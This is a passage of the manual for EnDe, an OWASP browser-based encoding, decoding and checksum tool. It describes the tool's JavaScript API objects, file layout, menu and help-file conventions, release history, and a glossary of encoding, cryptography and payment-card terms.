+	* "crc.js"
+	* "aes.js"
+	* "md4.js"
+	* "md5.js"
+	* "rmd.js"
+	* "sha.js"
+	* "sha512.js"
+	* "blowfish.js"
+	* "EnDeB64.js"
+	* "EnDeMaps.txt"
+	* "EnDeFunc.txt"
+	* "EnDeFunc.js"
+	* "EnDeFunc.html"
+	* "EnDeCheck.js"
+	* "EnDeUser.js"
+	
+	These files can be used without all other files anywhere.  Anything is
+	encapsulated in objects so that there should not be any name-space  or
+	name conflict (except the object names itself, obviously).
+	
+    API OBJECTS
+	
+	Each en-, decoding, conversion utility has its own object. The objects
+	are:
+	
+	* 'EnDe'        - global container object
+	* 'EnDe.CONST'  - used constants
+	* 'EnDe.CH'     - all about characters
+	* 'EnDe.ED'     - all about coding, encoding, decoding
+	* 'EnDe.EN'     - all encoding functions
+	* 'EnDe.DE'     - all decoding functions
+	* 'EnDe.IP'     - all IP related functions
+	* 'EnDe.TS'     - all timestamp conversion functions
+	* 'EnDe.B64'    - all Base64 related functions
+	* 'EnDe.UCS'    - all Unicode related functions
+	* 'EnDe.IDN'    - all IDN and puny code related functions
+	* 'EnDe.CRC'    - all CRC functions
+	* 'EnDe.AES'    - all AES functions
+	* 'EnDe.SHA'    - all SHA functions
+	* 'EnDe.MD4'    - all MD4 functions
+	* 'EnDe.MD5'    - all MD5 functions
+	* 'EnDe.RMD'    - all RIPEMD-160 functions
+<!--	* 'EnDe.RE'     - all regular expression related functions -->
+	
+	For a detailed description of these objects see  the definition of the
+	object itself in "EnDe.js" and "EnDeRE.js".
+	
+	Most of these objects provides a  'dispatch()' function  for a unified
+	access to all functions of the corresponding object.
+	
+	The API is available as  http:EnDe.lib.tgz
+	
+    API FUNCTIONS
+	
+	A brief description of all functions is available in http:EnDeFunc.js
+	and http:EnDeFunc.html .
+	
+    KNOWN API PROBLEMS
+	
+	See http:EnDe.man.html?EnDe.bug.txt#API
+	
+	
+HACKER's INFO
+	
+    General
+	
+	As  anything is implemented in  JavaScript,  we need to  remember that
+	JavaScript is based on Unicode, this means that all data being handled
+	by JavaScript is assumed to be Unicode.
+	These functions should work  flawless if they are feed with such  data
+	*and* EnDe is installed as desribed in  INSTALLATION  above.
+	Anyway, beside the installation, anything should work flawless for all
+	printable ASCII characters (except the listed  KNOWN PROBLEMS  and
+	  LIMITATIONS  ). For more coding hints, see  Unicode/UTF-8  below.
+	
+    JavaScript Versions
+	
+	All JavaScript code relies on  ECMA-262  standard (ECMAScript v3). For
+	example the code relies on some behaviors according Arrays and Objects
+	specified there (which violates implementations in some browser namely
+	Netscape 4.x).
+	Hence the includes of the scripts should be done using:
++-
+|	< script language="JavaScript1.3" text="text/javascript" src"...." >< /script>
++-
+	Only the files for the browser GUI and some 3'rd party tools require
+	
++-
+|	< script language="JavaScript1.5" text="text/javascript" src"...." >< /script>
++-
+	because they use:
++-
+|	try {...} catch(e) {...}
++-
+	These files are:
+	* "EnDeGUI.js"
+	* "EnDeRE.js"
+	* "EnDeREGUI.js"
+	* "EnDeTest.js"
+	* "EnDeUser.js"
+	* "JsColorizer.js"
+	* "JsDecoder.js"
+	* "JSReq.js"
+	
+	I. g. it should work with JavaScript1.3 anywhere as the used try-catch
+	blocks are for defensive programming only (to catch buggy browsers :).
+<!--
+	Except in "EnDeUser.js" where  'try {...}' is used to check if objects
+	contain properties.
+-->
+	
+    API files:
+	
+	For a brief description of the  functions available in the  API, refer
+	to  API FUNCTIONS  above.
+	
+	EnDe consist of following files (or is one single file which was built
+	from these files):
+	
+	* "EnDeMaps.txt"
+		Just contains some character maps for better maintanance.
+	* "EnDeMaps.js"
+		Functions to organize the character maps from "EnDeMaps.txt".
+	* "EnDe.js"
+		This file contains a JavaScript object 'EnDe' which implements
+		all required en-, decoding and  convertson functions,  for the
+		objects see  API OBJECTS  above also..
+		Each sub-object (see  API OBJECTS) contains its own dispatcher
+		which is called by 'EnDeGUI.*.dipatcher()'.  These dispatchers
+		are very simple.
+	* "aes.js", "md4.js", "md5.js", "rmd.js", "sha.js", "sha512.js", "crc.js",
+	  "blowfish.js"
+		 These files implement the corresponding JavaScript objects.
+	* "EnDeB64.js"
+		 Implements all Base-N functionality.
+	* "EnDeFunc.html"
+		Generated brief documentation for all functions.
+	* "EnDeFunc.js", "EnDeFunc.txt", "EnDeFunc.xml"
+		** experimental **
+		Generated 'EnDeFunc' object which contains all functions.
+	* "EnDeUser.js"
+		This file contains user-defined functions.
+		See  USER file "EnDeUser.js"  below.
+	* "EnDeCheck.js"
+		See  USER file "EnDeCheck.js"  below.
+	
+    GUI files:
+	
+	Following files are used for the GUI only:
+	
+	* "EnDeGUI.js", "EnDeMenu.txt"
+		'EnDeGUI' creates the (action) menus defined in "EnDeMenu.txt"
+		for the user interface of "index.html". It also contains global
+		'*.dipatcher()' for all other functions.  And it provides some
+		simple functions itself.
+	* "EnDeGUIx.js"
+		Part of "EnDeGUI.js" using its own file for better maintanance.
+	* "EnDeText.js"
+		Text manipulation functions, mainly used in "EnDeGUI.js".
+	* "EnDeFile.js"
+		Some helper functions, mainly used in "EnDeGUI.js".
+	* "EnDeVersion.js"
+		Just conatins the current release version.
+	* "EnDe.html"
+		This is the user interface to the functions.
+	* "index.html"
+		This is the user interface to the functions.  It is a generated
+		from "EnDe.html" and "license.txt".
+	* "EnDe.man.html", "EnDe.man.txt"
+		The manual you're just reading.
+	* "EnDeTest.js"
+		A JavaScript object to test all functions from "EnDe.js".
+		If included (as it is optional),  the tests are available when
+		appending '?test' to the URL.
+	* "EnDeFunc.html"
+		Generated documentation for "EnDeFunc.js".
+	* "EnDe.bug.txt"
+		Mainly "known problems" description.
+	* "EnDe*.css"
+		Some people want to have a nice layout.
+	* "EnDeSIDs.js"
+		Generated file, used for version check.
+	* "Makefile.in"
+		** experimental **
+		Makefile for future hackers ;-)
+	
+    GUI menu files:
+	
+	Following files are used for building menus in the GUI only:
+	
+	* "EnDeSamp.xml"
+		A sample .xml file to describe the syntax in there; not used.
+	* "./usr/EnDeMenu-Sample.txt"
+		A sample for a user-definable "EnDeMenu.txt"; not used.
+	* "EnDeOpts.txt"
+		Builds the [User API Options] menu in the GUI OPTIONS section.
+	* "EnDeFile.txt"
+		Builds the [Menu] menu in the GUI OPTIONS section.
+	* "xss.h4k.xml", "xssAttacks.xml", "xss.mario.xml", "sqlPattern.xml"
+		 Special menus to be loaded by [create menu] menu.
+	* "core-rules.xml", "core-rules-2.0.xml"
+		ModSecurity's Core Rule Set (will be added to RegEx).
+		This files were built using:
++-
+|		java -jar CoreRules2Html.jar core-rules.xml modsecurity-core-rules-x.y.z.tar.gz
++-
+	* "default_filter.xml"
+		PHPIDS's filter rules (will be added to RegEx).
+	* "EnDeCheck.txt"
+		Special checksum functions menu (will be added to Decoding).
+	* "EnDeFunc.xml"
+	* "EnDeFunc.txt"
+		File containing all  API functions used with  [Shuffle] button
+		and "EnDe funtions" menu in functions inset window.
+		(generated by EnDe2xml.pl)
+	* "EnDeUser.xml"
+		File containing user-defined functions for the functions inset
+		window.
+		New functions can be added in this file.
+	
+	Following files if found in the "usr/" directory  will be used instead
+	their original ones (as provided by each EnDe release):
+	* "usr/EnDeMenu.txt"
+	* "usr/EnDeMaps.txt"
+	* "usr/EnDeFile.txt"
+	* "usr/EnDeOpts.txt"
+	* "usr/EnDeCheck.txt"
+	* "usr/EnDeUser.xml"
+	* "usr/sqlPattern.xml"
+	
+	These files are never distributed with an EnDe release, and so are not
+	overwritten with new releases.  These files are supposed to be used to
+	customize the GUI by the user.
+	
+	Following files are  not used directly.  They are used as  simple text
+	source for generating the corresponding .xml file.
+	* "sqlPattern.txt"
+	
+	Obsolete files starting with version 1.0:
+	
+	Obsolete files starting with version 0.1.69:
+	* "EnDeOpts.xml"
+		(generated by opt2xml.pl from "EnDeOpts.txt")
+	* "EnDeFile.xml"
+	* "checksum.xml"
+	
+    USER file EnDeUser.js:
+	
+	This file contains user-defined functions.
+	Currently (04/2011) following user functions are implemented here:
+	
+	* 'EnDe.User.DE.vs'         - parse ASP.NET 1.x and 2.0 viewstate data
+	* 'EnDe.User.EN.vs'         - fold parsed ASP.NET 1.x viewstate data
+	* 'EnDe.User.DAT.isXXXX'    - return true if data in requested format
+	* 'EnDe.User.DAT.guess'     - try to identify data format
+	* 'EnDe.User.IMG.isXXXX'    - return true if data in requested format
+	* 'EnDe.User.IMG.guess'     - try to identify image format
+	* 'EnDe.User.IMG.getMIME64' - get MIME type for Base64 encoded image data
+	* 'EnDe.User.Check.dispatch'- dispatcher for functions in "EnDeCheck.js"
+	* 'EnDe.User.Check.quess'   - guessing checksums
+	* 'EnDe.User.init'          - initialize user data
+	<!-- This file will not be changed in future. -->
+	
+    USER file EnDeCheck.js:
+	
+	This file contains functions for checksums.
+	Currently (04/2011) following checksum functions are available:
+	
+	* 'EnDe.Check.D5'   - Verhoeff's Dihedral Group D5 Check algorithm
+	* 'EnDe.Check.EFT'  - Electronic Funds Transfer Routing Number Check
+	* 'EnDe.Check.UPC'  - Universal Product Code
+	* 'EnDe.Check.EAN'  - European Article Numbering (aka GS1, GLN, IAN)
+	* 'EnDe.Check.GLN'  - Global Location Numbering (aka GTIN, ILN)
+	* 'EnDe.Check.ISBM' - ISBN numbers (aka IBM mod 11 algorithm)
+	* 'EnDe.Check.Luhn' - Luhn (aka IBM) algorithm
+	* 'EnDe.Check.CC'   - check IIN - Issuer Identification Number
+	* 'EnDe.Check.SSN'  - check (US) social security number
+	* 'EnDe.Check.Byte1'- one byte checksum
+	
+	For each check following functions are implemented:
+	
+	* 'get()'           - compute the checksum value
+	* 'is()'            - check if number has valid checksum
+	* 'valid()'         - check if number contains valid checksum
+	* 'code()'          - check if number matches some special data
+	
+	These functions are implemented as  "user functions"  because they are
+	neither encoding nor decoding. They also return a value (like 'get()')
+	or just  true/false.
+	These functions do not change the  En- or Decoding textarea but show a
+	popup window instead.  This behaviour can simply be changed by editing
+	the  'dispatch()' function in "EnDeUser.js".
+	That's why the menu for  these functions is not visible by default but
+	must be added with the [Menu] button (see  GUI OPTIONS  above).
+	
+	The implementation is as follows:
+	
+	* core functionality (API) in "EnDeCheck.js"
+	* 'EnDe.User.Check.dispatch()'  in  "EnDeUser.js" to be called by GUI
+	* menu definition for functions  available in GUI in  "EnDeCheck.txt",
+		  hence it must be enabled with  GUI OPTIONS  .
+	
+	A simple GUI for testing is available in  http:EnDeCheck-Test.html .
+	
+    OTHER FILES
+	
+	Following files are not yet (06/2010) used and just for documentation:
+	
+	* "xss-evation.txt" - file with various XSS patterns
+	
+	These files cannot be used to build menus,  but may be loaded into any
+	of the input fields using the [>Encoding], [>Decoding] etc. buttons.
+	Or they can be loaded into their own window using the  [show payloads] 
+	button.
+	
+    GUI MENUS
+	
+	There're 2 possibilities to build menus:
+	
+	# using tab-separated text in  "*.txt"  files and building the menu in
+	  'EnDeGUI.init()' and/or  'EnDeGUI.makemenu()'.
+	# using XML in whatever file and adding that file to "EnDeFile.txt"
+	
+	With the first -text- method it is more comfortable to define the menu
+	as simple text,  but requires programming in  'init()'.  Alternatively
+	 'makemenu()' may be used. These menus are highly customizable.
+	The second -XML- method is more cumbersome as 2 files need to be setup
+	correctly: the ".xml" file containing the menu and "EnDeFile.txt"  but
+	has the advantage that no additional programming is necessary.
+	
+	The text method is prefered for the built-in menus.  The XML method is
+	used for building user-definable menus. All menus in all tool sections
+	are built from text. Some menus in  GUI OPTIONS  and  API OPTIONS  are
+	built from XML, as they are subject to user customization.
+	
+	New menus can be added anywhwere to the GUI,  see [create menu] button
+	for "Load File" [Menu]. See  LOADING FILES  for more details.
+	
+	All menu files found in "usr/" directory are used instead the original
+	one found in "./". These files can be used to customize the GUI.
+	
+	Please see
+	* http:EnDe.man.html?forcetxt&EnDeSamp.xml
+		for a detailed description about the syntax in ".xml" files
+	* http:EnDe.man.html?forcetxt&EnDeMenu.txt
+		for a detailed description about the syntax in ".txt" files.
+	
+	Example
+	=======================================
+	To understand how this works, simply do following:
+	
+	# copy an existing  .xml  file, for example  "sqlPattern.xml" to a new
+	  file, for example "my.xml"
+	# select the object where you want to add the menu
+	# add "my.xml" to the file input field
+	# hit return (or the [create menu] button)
+	
+	Though, even it is possible,  it does not yet make sense to add a menu
+	to some of the listed tools.
+	
+    HELP FILES
+	
+	All help texts are organized as plain text files.
+	A JavaScript function in  "EnDe.man.html" can be used to display these
+	texts in HTML style. Therefore the text in these files  need to comply
+	to some rules:
+	
+	* a line with just capital letters is a head line
+	* lines starting with * are unnumbered lists
+	* lines starting with # are numbered lists
+	* strings enclosed in double quotes (") are emphased
+	* strings enclosed in single quotes (') are printed in code style
+	* text quoted like `quoted text' are displayed as is (literal text)
+	* block boxes for code start with a single  +-  line and end with  +-
+	* lines starting with | are part of code boxes
+	* text like `[text]' are shown in button style: [text]
+	* text like `[42]' are shown in super position and used as reference
+	* due to limitations in HTML syntax, tags cannot be written  verbatim,
+		  workaround: the leading <. needs to be followed by one space
+	* lines starting with a tab followed by spaces will force a line break
+		  if used inside lists (dirty hack, will be removed in future)
+	* all  `http://xxxx' texts are links to external files: http://xxxx 
+	* all  `http:xxxx 'texts are links to lokal files: http:xxxx 
+	* a string with capital letters enclosed with  2 spaces on  both sides
+		  is a refernces to anchors (head line) in the page itself
+		  (if such a reference is at the end of the line, the trailing
+		   2 spaces must be present too due to  parsing limitations)
+	* empty lines  should have at least one tab  (this is a workaround for
+	  buggy browsers which do not support 'white-space:pre;' styles)
+	
+	In  some browsers (namely all Mozilla/Firefox), conversion from  plain
+	text to HTML is dreadful slow (200 times --in words: two hundred-- and
+	more compared to WebKit-based browsers).
+	
+<!-- NOT YET IMLEMENTED
+* [x] NAME        -> (literal x) <input type=checkbox> NAME
+* (x) NAME        -> (literal x) <input type=radiobox> NAME
+  -->
+	
+    JavaScript and DOM Objects
+	
+	All variables and functions are encapsulated in objetcs. These objects
+	are:
+
+	* 'EnDe'    - all variables and functions used in the  API  
+	* 'EnDeGUI  - all variables and functions used in the  GUI  
+	* 'EnDeRE   - all variables and functions used in the Regex GUI
+	
+    XMLHttpRequest()
+	
+	The javaScript function 'XMLHttpRequest()' is used to read an external
+	file.  It can read XML files and return a corresponding DOM, or it can
+	read any text file and return the text as is.
+	There're  no browser detections and hence  different implementaions of
+	'XMLHttpRequest()' are not supported.
+	The function is also called in synchronous mode only, which avoids the
+	definition of a seperate handler function.  Further processing  of the
+	read file content can be done by calling a proper function right after
+	the reading function complets.
+	
+    Same Origin Policy
+	
+	Note that files to be loaded into the browser need to be read from the
+	local file system, means that the current URI is of the form:
+		'file:///.... .html'
+	otherwise  most browsers  would not load the file but bail out with an
+	error due to the  same origin policy violation.  That's why some files
+	are provided with this distribution.  The original file (or an updated
+	one) also can be loaded with the provided menu from the  corresponding
+	web site (but the same origin policy counts again).
+	However, some browsers can be tweaked to read cross-domain files also.
+	
+	The  same origin policy applies to the  'XMLHttpRequest()' function as
+	well as the browser's build-in file selection box.
+	
+	Using  EnDe from the local file system with  'file:///.... .html' will
+	avoid most of the same origin policy problems.
+	See  KNOWN GUI PROBLEMS  also.
+	
+    Unicode/UTF-8
+	
+	The primary list of all characters is defined in "EnDeMaps.txt". These
+	are simple text based maps (see description there) which are stored in
+	JavaScript hashes by the code in "EnDeMaps.js".  The hashes (maps) are
+	used then in  all (most)  en-, decoding and conversion functions, this
+	means that these functions are data-driven. However there're also some
+	algorithmic functions like those in the  'EnDe.UCS.' object:  'h2f()',
+	'f2h()', 'utf16le()', 'utf16be', 'utf32le()', 'utf32be'.
+	
+	Some special Unicode characters, which are used to build menus, can be
+	found in "EnDeMaps.txt" also, see  UNICODE MENU  for details.
+	
+    Development Hints
+	
+	How to find out which functions are called?
+	=======================================
+	Start EnDe with the '?trace' option, then check the  Trace tool after
+	calling the function.
+	
+	What exactly is the syntax for calling functions?
+	=======================================
+	Best you use the functionality provided by the inset window shown with
+	the [Functions] button. Then select your function from any menu in the
+	GUI (see  MODE  above).
+	
+    Development
+	
+	A "Makefile" for traditional `make' provides some often used tasks.
+	Simply calling
++-
+|		make
++-
+	shows a brief usage of the targets in the Makefile. If in doubt, start
+	make with the  '-n'  option to see what would be done.
+	
+USAGE
+	
+	For GUI usage see  QUICK START  and  GUI  above.
+	For API usage see  API  above.
+	
+	
+USER
+	
+	** EXPERIMENTAL IMPLEMENTATION **
+	See  GUI OPTIONS  how to implement user functions in "EnDeUser.js".
+	
+	
+KNOWN PROBLEMS
+	
+	For browser problems see  BROWSER QUIRKS.  
+	See http:EnDe.man.html?EnDe.bug.txt
+	
+	
+FEEDBACK
+	
+	For future development, the author would like to get some feedback.
+	Therefore http:EnDe.man.html?EnDe.survey.txt was setup, it will become
+	a interactive form soon.
+	If you can't resist, feel free to copy&paste and send it as e-mail ;-)
+	
+	
+HISTORY
+	
+	* 05/2012  1.0rc10
+	* 12/2011  1.0rc9
+	* 11/2011  1.0rc8
+	* 09/2011  1.0rc7
+	* 08/2011  1.0rc6 (OWASP Live CD release)
+	* 04/2011  1.0rc5
+	* 02/2011  1.0rc4
+	* 02/2011  1.0rc3
+	* 12/2010  1.0rc2
+	* 12/2010  1.0rc1
+	* 10/2010  cleanup of sources, simplified; EnDeHTTP experimental implemented
+	* 01/2010  bugfix and cleanup release
+	* 10/2009  OWASP Live CD release
+	* 08/2009  guess and fuzzy functions improved
+	* 07/2009  documentation improved; code and CSS simplified
+	* 06/2009  simple text files for menus; special Unicode menus implemented
+	* 03/2009  CSS improvements and bugfixes; all experimental function in GUI
+	* 02/2009  lot of improvements and bugfixes; none web-based codings
+	* 12/2008  improved design
+	* 10/2008  API library released EnDe.lib.tgz
+	* 06/2008  OWASP project
+	* 03/2008  initial RegEx implementation
+	* 08/2007  documentation completed
+	* 06/2007  complete and working release: En-/Decoding, IP, Timestamp
+	* 02/2007  start of project, based on some code from CAL9000
+	
+	For a detailed change history see http:EnDe.man.html?EnDe.changes.txt
+	
+	
+GLOSSAR
+	
+	A short list of used terms and acronyms, always incomplete ...
+	
+	AAV     - Accountholder Authentication Value
+	Adler32 - hash function
+	ACS     - Access Control Server (mainly used in payment industry)
+	AES     - Advanced Encryption Standard
+	ANSI    - American National Standards Institute
+	ANSI    - sometimes acronym for code page 1252 (aka CP-1252)
+	ASCII   - American Standard Code for Information Interchange
+	Ascii85 - alias for Base-85
+	ARC4    - Alleged RC4 (see RC4)
+	ARCFOUR - alias for ARC4
+	AVS     - Address Verification System
+	Base-32hex  - binary to text encoding (path save)
+	Base-32 - binary to text encoding
+	Base-64 - binary to text encoding
+	Base-85 - binary to text encoding
+	Base32u     - alias for Base-32hex
+	Base32Url   - alias for Base-32hex
+	Base-N  - (EnDe's internal term for all Base* codings)
+	BIN     - Bank Identification Number
+	BOM     - Byte Order Mark
+	BMP     - Basic Multilingual Plane (Unicode plane 0000-ffff)
+	BMP Character   - Unicode encoded character having a BMP code point
+	BNF     - Backus-Naur Form
+	Blowfish- symmetric block cipher
+	BOCU-1  - Binary Ordered Compression for Unicode
+	Braille - writing system, letters used for blind people
+	CAP     - Chip Authentication Programme
+	CAST-128- Carlisle Adams and Stafford Tavares, block cipher
+	CAST5   - alias for CAST-128
+	CAST-256- Carlisle Adams and Stafford Tavares, block cipher
+	CAST6   - alias for CAST-256 (see http://tools.ietf.org/html/rfc2612 )
+	CAVV    - Cardholder Authentication Verification Value
+	Ceasar  - alias for ROT-13 (hstorical name)
+	CESU-8  - Compatibility Encoding Scheme for UTF-16
+	CBC     - Cyclic Block Chaining
+	CBC     - Cipher Block Chaining (sometimes)
+	CEF     - character encoding form
+	CES     - character encoding scheme
+	CFB     - Cipher Feedback
+	CJK     - Acronym for Chinese, Japanese, and Korean
+	CJKV    - Acronym for Chinese, Japanese, Korean, and Vietnamese
+	CMAC    - block cipher algorithm
+	CMS     - Cryptographic Message Syntax (see http://tools.ietf.org/html/rfc3852 )
+	CLDR    - Common Locale Data Repository
+	CRC     - Cyclic Redundancy Check
+	CRC-16  - 
+	CRC-32  - 
+	CRC-32b - 
+	CCID    - Credit Card ID, see CSC
+	CSI     - Code Structure Identifier (for SICI)
+	CSC     - Card Security Code
+	CVC     - sometimes called Card Verification Code
+	CVC1    - see CVV
+	CVC2    - see CVV
+	CVV     - sometimes called Card Verification Value
+	CVV1    - see CVV
+	CVV2    - printed CVV on bankvard (see CVV)
+	D5      - Verhoeff's Dihedral Group D5 Check
+	DataBar-14  - see GS1
+	DBSC    - double-byte character set
+	DEA     - Data Encryption Algorithm (sometimes a synonym for DES)
+	DES     - Data Encryption Standard
+	3DES    - Triple DES
+	DPA     - Dynamic Passcode Authentication (see CAP)
+	DPI     - Derivative Part Identifier (for SICI)
+	DOI     - Digital Object Identifier
+	DSA     - Digital Signature Algorithm
+	DUCET   - Default Unicode Collation Element Table
+	D-U-N-S - Data Universal Numbering System
+	EAN     - European Article Numbers
+	EAN-13  - 13-digit EAN
+	EAN-8   - 8-digit EAN
+	EBCDIC  - Extended Binary-Coded Decimal Interchange Code
+	ECB     - Electronic Codebook
+	ECC     - Elliptic Curve Cryptography
+	ECCS	- extended combining character sequence
+	ECDH    - Elliptic Curve Diffie Hellman
+	EFT     - Electronic Funds Transfer Routing Number Check (10-digit)
+	EGC     - extended grapheme cluster
+	EMV     - Europay, MasterCard, and Visa (see CAP)
+	EUDC    - end-user defined character
+	FAC     - Final Assembly Code (Endmontagekennung bei Mobiles)
+	FIPS    - Federal Information Processing Standard
+	FIPS46-2    - FIPS Data Encryption Standard (DES)
+	FIPS73      - FIPS Guidelines for Security of Computer Applications
+	FIPS140-2   - FIPS Security Requirements for Cryptographic Modules
+	FIPS180-3   - FIPS Secure Hash Standard
+	              (requires: FIPS PUB 46-2, FIPS PUB 73, FIPS PUB 140-1, FIPS PUB 186)
+	FIPS186-3   - FIPS Digital Signature Standard (DSS)
+	FIPS197     - FIPS Advanced Encryption Standard (AES)
+	FIPS198-1   - FIPS The Keyed-Hash Message Authentication Code (HMAC)
+	FIRMR   - Federal Informations Resources Management Regulations
+	FSS-UTF - File System Safe UCS Transformation Format (aka UTF-8)
+	GC      - grapheme cluster (aka General_Category property)
+	GCGID   - Graphic Character Global Identifier
+	GLN     - International Location Number, see EAN
+	GTIN    - Global Trade Item Number, see EAN
+	GOST    - gosudarstvennyy standart (???? - ??????????????? ????????)
+	GS1     - Global Standards One, see EAN
+	GZIP    - Lossless compression file format (see http://tools.ietf.org/html/rfc1952 )
+	HAVAL   - one-way hashing
+	HAS-160 - hash function
+	HAS-V   - hash function
+	HMAC    - keyed-Hash Message Authentication Code
+	HTOP    - HMAC-Based One-Time Password (see http://tools.ietf.org/html/rfc4226 )
+	IAN     - International Article Number, see EAN
+	IANA    - Internet Assigned Numbers Authority
+	IBAN    - International Bank Number
+	iCVV    - Dynamic CVV
+	ICU     - International Components for Unicode
+	IDEA    - International Data Encryption Algorythm (see http://tools.ietf.org/html/rfc3058 )
+	IDN     - Internationalized Domain Name (aka Punycode)
+	IIN     - Issuer Identification Number (6-digits)
+	ILN     - International Location Number, see EAN
+	IMEI    - International Mobile Station Equipment Identity
+	IMEISV  - International Mobile Station Equipment Identity and Software Version Number
+	IMSI    - International Mobile Subscriber Identity
+	IPA     - International Phonetic Alphabet
+	IPA     - International Phonetic AAssociation
+	IRG     - Ideographic Rapporteur Group
+	ISCII   - Indian Script Code for Information Interchange
+	ISO 7812- IIN (MII + 5 digits) + account number + single digit (Luhn) checksum
+	ISBN    - International Standard Book Number
+	ISIN    - International Securities Identifikation Number (Internationale Wertpapierkennnummer, ersetzt WKN)
+	ISMN    - International Standard Music Number
+	ISAN    - see ISMN
+	ISPI    - see ISMN
+	ISRC    - see ISMN
+	ISSN    - International Standard Serial Number
+	ISTC    - see ISMN
+	ISWC    - see ISMN
+	JTC1    - Joint Technical Committee 1
+	KEA     - Key Exchange Algorithm (see http://tools.ietf.org/html/rfc2773 )
+	KPN     - Kartenpr�fnummer
+	LDML    - Locale Data Markup Language
+	LSB     - least significant byte
+	LZW     - Lempel-Ziv-Welch (compression algorithm)
+	LM      - LAN Manager hash
+	MAC     - Message Authentication Code
+	MBCS    - multibyte character set
+	MDC-2   - Modification Detection Code 2 (aka Meyer-Schilling)
+	MD2     - Message Digest 2 (see http://tools.ietf.org/html/rfc1319 )
+	MD3     - Message Digest 3
+	MD4     - Message Digest 4 (see http://tools.ietf.org/html/rfc1320 )
+	MD5     - Message Digest 5 (see http://tools.ietf.org/html/rfc1321 )
+	MFI     - Medium/Format Identifier (for SICI)
+	MID     - Merchant Identifikation Number
+	MII     - Major Industry Identifier (a single digit)
+	MIME    - Multipurpose Internet Mail Extensions
+	MISTY1  - block cipher algorithm
+	MOTO    - Mail Order, Telefon Order
+	MSB     - most significant byte
+	NCE     - Named Character Entity (aka HTML entity)
+	NCR     - Numeric Character Reference (aka HTML entity)
+	NFC     - Normalization Form C
+	NFD     - Normalization Form D
+	NFKC    - Normalization Form KC
+	NFKD    - Normalization Form KD
+	NSIN    - National Securities Identifikation Number (Nationale Wertpapierkennnummer), part of ISIN
+	NSM     - nonspacing mark
+	NVE     - Nummer der Versandeinheit (aka SSCC)
+	OFB     - Output Feedback
+	OTP     - One Time Password (see http://tools.ietf.org/html/rfc2289 )
+	PED     - PIN entry devices
+	PKCS    - Public-Key Cryptography Standards
+	PUA     - Private Use Area (Unicode plane f0000-10ffff)
+	Rabbit  - stream cipher algorithm
+	Radix-64- alias for Base-64
+	RC2     - Rivest Cipher 2, block cipher; (see http://tools.ietf.org/html/rfc2268 )
+	RC4     - Rivest Cipher 4, stream cipher; (aka Ron's Code)
+	RC5     - Rivest Cipher 5, block cipher;
+	RC6     - Rivest Cipher 6
+	RCSU    - Reuters' Compression Scheme for Unicode (aka SCSU)
+	Rijndael- symmetric block cipher algorithm
+	RIPEMD  - RACE Integrity Primitives Evaluation Message Digest
+	ROT-13  - see XOR
+	RSS-14  - Reduced Space Symbology, see GS1
+	RTN     - Routing transit number
+	SAFER   - Secure And Fast Encryption Routine, block cipher
+	SAM     - syriac abbreviation mark
+	SBCS    - single-byte character set
+	SCSU    - Standard Compression Scheme for Unicode (compressed UTF-16)
+	SKIPJACK- block cipher algorithm
+	SEED    - block cipher algorithm
+	SGML    - Standard Generalized Markup Language (aka ISO 8879)
+	SIP     - Supplementary Ideographic Plane (Unicode plane 20000-2ffff)
+	SICI    - Serial Item and Contribution Identifier (enhancement to ISSN)
+	SJIS    - acronym for Shift-JIS
+	Square  - block cipher
+	SHA     - Secure Hash Algorithm
+	SIN     - Social Insurance Number (Canada)
+	Skein   - hash function
+	SMP     - Supplementary Multilingual Plane (Unicode plane 10000-1ffff)
+	Snefu   - hash function
+	SSCC    - Serial Shipping Container Code (aka NVE)
+	SSP     - Supplementary Special-purpose Plane (Unicode plane 30000-3ffff)
+	SSN     - (U.S.) Social Security Number
+	TAC     - Type Approval Code (Baumuster-Akkreditierungskennung bei Mobiles)
+	TEA     - Tiny Encryption Algorithm
+	TES     - transfer encoding syntax
+	TEX     - computer language designed for use in typesetting
+	Tiger   - hash function
+	TIN     - Global Trade Item Number, see EAN
+	TMSI    - Temporary Mobile Subscriber Identity
+	Threefish   - hash function
+	Twofish - symmetric key block cipher
+	UAX     - Unicode Standard Annex
+	UCA     - Unicode Collation Algorithm
+	UCAF    - Universal Cardholder Authentication Field
+	UCD     - Unicode Character Database
+	UCS     - Universal Character Set (aka ISO/IEC 10646)
+	UCS-2   - single code value UCS (obsolete name for  UTF-8)
+	UCS-2BE - see UTF-16BE
+	UCS-2LE - see UTF-16LE
+	UCS-4   - 31-bit Unicode character
+	UCS-16  - **does not exists**, UCS-2 is meant, usually
+	UPC     - Universal Product Code
+	UPC-A   - 12-digit UPC
+	UPC-E   - compressd UPC
+	UPC-12  - alias for UPC-A
+	URA     - Uralic Phonetic Alphabet
+	URI     - Universal Resource Identifier
+	URL     - Universal Resource Locator
+	URO     - Unified Repertoire and Ordering (see CJK also)
+	UTF     - Unicode Transformation Format
+	UTF-1   - 8-bit UTF, single byte encoding
+	UTF-5   - historical
+	UTF-6   - historical
+	UTF-7   - 7-bit UTF, variable length character encoding (aka RFC-2152)
+	UTF-8   - 8-bit UTF, variable length character encoding
+	UTF-9   - released 1. April 2005
+	UTF-16  - 16-bit UTF, extension to UCS-2 (see http://tools.ietf.org/html/rfc2781 )
+	UTF-32  - 32-bit UTF, extension to UCS-4
+	UTF-16BE- UTF-16 big endian byte ordering
+	UTF-16LE- UTF-16 little endian byte ordering
+	UTF-32BE- UTF-32 big endian byte ordering
+	UTF-32LE- UTF-32 little endian byte ordering
+	UTF-EBCDIC  - see http://www.unicode.org/reports/tr16/ <!-- ugly hack: must have a traling space -->
+	UTN     - Unicode Technical Note
+	UTR     - Unicode Technical Report
+	UTS     - Unicode Technical Standard
+	WHIRLPOOL   - hash function
+	WKN     - Wertpapierkennnummer
+	XML     - eXtensible Markup Language (subset of SGML)
+	XTEA    - extended Tiny Encryption Algorithm
+	XXTEA   - enhanced/corrected Tiny Encryption Algorithm
+	z-Base32- binary to text encoding
+	ZLIB    - Lossless compression file format
+	
+	
+LINKS
+	
+	This project was inspired by (and/or having some frustrations with) or
+	uses some code from (list not sorted anyhow):
+	* http://watchfire.com/ AppScan Encoder/Decode (bundled with AppScan)
+	* http://watchfire.com/ AppScan Encoder/Decode (built-in)
+	* https://www.bindshell.net/tools/beef/ BeEF
+	* http://www.safecenter.net/liudieyu/codeNOW.htm CodeNOW (dead?)
+	    * http://yakeworld.googlepages.com/codenow.html En-/decoder
+	* http://www.movable-type.co.uk/scripts/tea-block.html Block TEA (aka XXTEA)
+	* http://www.owasp.org/index.php/Category:OWASP_CAL9000_Project CAL9000 (OWASP)
